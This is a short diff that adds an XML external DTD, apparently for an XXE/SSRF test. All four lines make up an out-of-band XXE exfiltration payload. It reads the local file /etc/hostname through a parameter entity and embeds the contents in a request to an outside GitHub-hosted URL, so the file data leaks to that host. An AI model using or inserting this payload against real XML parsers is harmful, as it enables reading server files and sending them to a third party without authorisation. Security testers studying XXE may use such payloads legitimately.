@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://raw.githubusercontent.com/jioja32/tmp-ssrf-test/main/leak_marker_%file;'>">
+%eval;
+%send;
